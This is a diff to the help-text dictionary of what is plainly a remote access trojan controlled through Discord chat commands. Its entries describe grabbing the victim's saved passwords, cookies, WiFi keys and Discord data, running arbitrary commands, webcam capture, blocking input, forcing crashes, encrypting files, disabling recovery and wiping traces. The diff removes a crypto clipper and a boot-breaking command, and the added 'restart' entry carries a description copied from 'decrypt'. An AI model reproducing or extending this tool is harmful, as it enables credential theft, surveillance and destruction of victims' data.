@@ -384,8 +384,6 @@ help = {
         'kill': ['➡️ `.kill <process-name>`', 'Kills a specified process. Options:\n🔹process-name - kills a specific process based on .show generated process-names'],
         'block-input': ['➡️ `.block-input`', 'Blocks keyboard and mouse inputs of the victim\'s PC'],
         'unblock-input': ['➡️ `.unblock-input`', 'Unblocks keyboard and mouse inputs of the victim\'s PC'],
-        'start-clipper': ['➡️ `.start-clipper`', 'Starts the Crypto Clipper thread on the victim\'s PC'],
-        'stop-clipper': ['➡️ `.stop-clipper`', 'Stops the Crypto Clipper thread on the victim\'s PC'],
         'set-critical': ['➡️ `.set-critical`', 'Elevates the process to critical status.'],
         'unset-critical': ['➡️ `.unset-critical`', 'Removes the critical status from the process.'],
         'grab': ['➡️ `.grab <what-to-grab>`', 'Grabs specified information. Options:\n🔹passwords - grabs all browser-saved passwords\n🔹history - grabs the browser history\n🔹cookies - grabs browser-cookies\n🔹wifi - grabs all WiFi saved passwords\n🔹discord - grabs all possible information from victim\'s Discord account\n🔹all - grabs discord information, passwords & cookies'],
@@ -403,8 +401,8 @@ help = {
     'commands2': {
         'blacklist': ['➡️ `.blacklist <process-name>`', 'Adds the specified process to the blacklist.'],
         'whitelist': ['➡️ `.whitelist <process-name>`', 'Removes the specified process from the blacklist.'],
-        'turnoff': ['➡️ `.turnoff`', 'Turns all monitors off'],
-        'turnon': ['➡️ `.turnon`', 'Turns all monitors on'],
+        'monitors-off': ['➡️ `.monitors-off`', 'Turns all monitors off'],
+        'monitors-on': ['➡️ `.monitors-on`', 'Turns all monitors on'],
         'block-website': ['➡️ `.block-website <url>`', 'Blocks the specified website from being accessed from any browser.'],
         'unblock-website': ['➡️ `.unblock-website <url>`', 'Unblocks access to a previously blocked website.'],
         'webcam': ['➡️ `.webcam photo`', 'Takes a photo of a victim\'s webcam (if one is detected)'],
@@ -416,11 +414,11 @@ help = {
         'cmd': ['➡️ `.cmd <command>`', 'Executes specified Command Prompt command on the victim\'s PC and sends back the output. Options:\n🔹command - a CMD command that will be executed on victim\'s PC'],
         'bsod': ['➡️ `.bsod`', 'Triggers a Blue Screen of Death on the victim\'s PC.'],
         'jumpscare': ['➡️ `.jumpscare`', 'Plays a very loud & rapidly flashing video.'],
-        'break-windows': ['➡️ `.break-windows`', 'Destroys Windows by renaming the boot manager. (Dangerous)'],
         'disable-reset': ['➡️ `.disable-reset`', 'Disables windows recovery (ReAgentC)'],
         'enable-reset': ['➡️ `.enable-reset`', 'Enables windows recovery (ReAgentC)'],
         'encrypt': ['➡️ `.encrypt <directory>`', 'Encrypts every file in the specified directory'],
         'decrypt': ['➡️ `.decrypt <directory>`', 'Decrypts every file in the specified directory'],
+        'restart': ['➡️ `.restart`', 'Decrypts every file in the specified directory'],
         'implode': ['➡️ `.implode`', 'Entirely wipes the malware off of the victim\'s PC (to remove traces).']
     }
 }
